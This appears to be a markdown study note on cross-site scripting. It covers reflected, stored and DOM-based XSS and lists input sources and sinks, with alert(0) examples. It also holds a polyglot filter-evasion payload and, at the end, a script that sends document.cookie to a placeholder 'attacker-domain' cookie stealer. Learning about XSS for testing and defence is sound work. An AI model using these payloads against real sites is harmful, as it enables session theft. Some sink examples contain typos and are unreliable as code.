## XSS

execute arbitrary javascript code by injecting it in user input 
```javascript
<script>alert(0)</script>
```



### Reflected XSS 
look for directly reflected input that could be vulnerable 
(injects the code into the html)
● Input Fields like search 

### Stored XSS
look for input that gets saved and THEN reflecetd somewhere for users to see 
● Email
● Username
● BIO
● Address
● Comments
● Images
● Links

### DOM based XSS
happens in the brower without doing any http requests (in the js code itself)
from search param to js for instance 
look for 
```javascript
eval(input);
```
note:
eval(console.log('inner function executes first'));

look for input in :
● document.URL
● document.documentURI
● document.baseURI
● location
● location.href
● location.search
● location.hash
● Location.pathname
● Document.cookie

look for sinks that excecute the input 
###### Sinks with examples :
Eval           
```javascript
eval(“Javascript Code” + alert(0))
```
Function  
```javascript
 function(“Javascript Code” + alert(0))
```
SetTimeout  
```javascript
settimeout(“Javascript Code” + alert(0),1)
```
SetInterval 
```javascript
setinterval(“Javascript Code” + alert(0),1)
```            
Document.write 
```javascript
document.write("html"+ “<img src=/ onerror=alert(0)”)
```     
Element.innerHTML 
```javascript
 div.innerHTML = "htmlString"+ “<img src=/ onerror=alert(0)”
```
#### Polyglots
use polyglots to trigger different types of xss

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/>oNloAd=alert()//>\x3e
```
use xss to steal cookies 
```javascript
<script type="text/javascript">document.location='http://attacker-domain/cookiestealer?cookie='+document.cookie; </script>
```